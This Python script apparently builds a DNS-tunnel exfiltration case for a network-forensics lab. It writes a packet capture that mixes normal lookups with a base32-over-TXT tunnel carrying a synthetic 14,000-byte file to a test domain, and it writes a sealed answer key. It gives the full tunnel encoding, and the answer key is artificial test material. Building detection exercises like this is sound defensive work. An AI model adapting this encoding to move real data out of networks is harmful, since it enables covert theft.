#!/usr/bin/env python3
"""Case 03: 10 minutes of normal DNS, then a base32-over-TXT DNS tunnel exfiltrating a 14,000-byte synthetic file."""
import base64
import hashlib
import socket
import struct
import sys
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from pcaplib import Capture

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "cases/case03_dns_tunnel/raw/case03.pcap"
GT = ROOT / "ground_truth/case03_ground_truth.md"

VIC, RES = "192.168.56.40", "192.168.56.53"
DOMAIN = "t.exfil-lab.test"
T0 = datetime(2026, 11, 5, 10, 0, 0, tzinfo=timezone.utc).timestamp()
cap = Capture(seed=303)
rng = cap.rng
iso = lambda t: datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3] + "Z"


def enc_name(n):
    return b"".join(bytes([len(l)]) + l.encode() for l in n.rstrip(".").split(".")) + b"\x00"


def dns_query(txid, qname, qtype):
    return struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) + enc_name(qname) + struct.pack("!HH", qtype, 1)


def dns_resp(txid, qname, qtype, rdata, ttl):
    q = enc_name(qname) + struct.pack("!HH", qtype, 1)
    ans = b"\xc0\x0c" + struct.pack("!HHIH", qtype, 1, ttl, len(rdata)) + rdata
    return struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) + q + ans


counter = [0]


def one_query(t, qname, qtype, rdata, ttl, latency):
    """Emit a query and its response; returns (query frame bytes, DNS payload bytes)."""
    counter[0] += 1
    sport = 32768 + (counter[0] * 37) % 28000          # unique source port per query (no 5-tuple reuse)
    txid = rng.randint(0, 65535)
    q = dns_query(txid, qname, qtype)
    cap.udp(t, VIC, sport, RES, 53, q)
    cap.udp(t + latency, RES, 53, VIC, sport, dns_resp(txid, qname, qtype, rdata, ttl), ttl=61)
    return len(q) + 42, len(q)


# ---- Baseline: 40 ordinary A lookups spread over the first 10 minutes ----
NAMES = ["www.example.test", "mail.example.test", "update.corp.test", "cdn.example.test", "time.corp.test",
         "login.example.test", "files.corp.test", "api.example.test", "intranet.corp.test", "static.example.test"]
base_times = sorted(T0 + rng.uniform(1, 598) for _ in range(40))
for bt in base_times:
    name = rng.choice(NAMES)
    ip = f"203.0.113.{rng.randint(10, 200)}"
    one_query(bt, name, 1, socket.inet_aton(ip), 300, rng.uniform(0.004, 0.03))

# ---- Synthetic secret: exactly 14,000 bytes ----
lines, i = [], 0
while sum(len(l) for l in lines) < 14000:
    i += 1
    lines.append(f"SYNTHETIC-LAB-RECORD {i:04d} emp=E{rng.randint(10000, 99999)} salary={rng.randint(8000, 45000)} note=NOT-REAL-DATA\n")
secret = "".join(lines).encode()[:14000]

# ---- Tunnel: init, 200 data queries of 70 bytes each, fin ----
T_TUN = T0 + 600
t = T_TUN
q_frames = q_payload = 0
f, p = one_query(t, f"init.{DOMAIN}", 16, b"\x05ready", 0, 0.02)
q_frames += f
q_payload += p
seq = 0
for k in range(0, len(secret), 70):
    seq += 1
    t += rng.uniform(0.18, 0.30)
    b32 = base64.b32encode(secret[k:k + 70]).decode().lower().rstrip("=")
    labels = [f"s{seq:04d}", b32[:56]] + ([b32[56:]] if len(b32) > 56 else [])
    txt = f"a{seq:04d}".encode()
    f, p = one_query(t, ".".join(labels + [DOMAIN]), 16, bytes([len(txt)]) + txt, 0, rng.uniform(0.012, 0.035))
    q_frames += f
    q_payload += p
t += 0.25
txt = b"done"
f, p = one_query(t, f"fin.s{seq:04d}.{DOMAIN}", 16, bytes([len(txt)]) + txt, 0, 0.02)
q_frames += f
q_payload += p

n = cap.write(OUT)
sha = hashlib.sha256(secret).hexdigest()
GT.write_text(f"""# SEALED GROUND TRUTH - Case 03
- Generated packets: {n}   (242 DNS transactions = 40 baseline + 202 tunnel)
- Victim {VIC} -> resolver {RES}:53/udp; tunnel parent domain `{DOMAIN}` (registered domain exfil-lab.test)
- Baseline traffic: {iso(base_times[0])} .. {iso(base_times[-1])} (40 A queries, TTL 300)
- Tunnel: {iso(T_TUN)} .. {iso(t)}; format `sNNNN.<base32 label 56>.<base32 label 56>.{DOMAIN}`, qtype TXT, responses TXT `aNNNN`
- Queries: 1 init + {seq} data + 1 fin = {seq + 2}; 70 raw bytes per data query -> 14000 bytes total
- Secret sha256 = {sha}
- Tunnel query frame bytes (Ethernet included) = {q_frames}; DNS payload bytes = {q_payload}; IP bytes = {q_frames - 14 * (seq + 2)}
""")
print(f"[case03] wrote {OUT} ({n} packets); tunnel {iso(T_TUN)} -> {iso(t)}; secret sha256 {sha}")
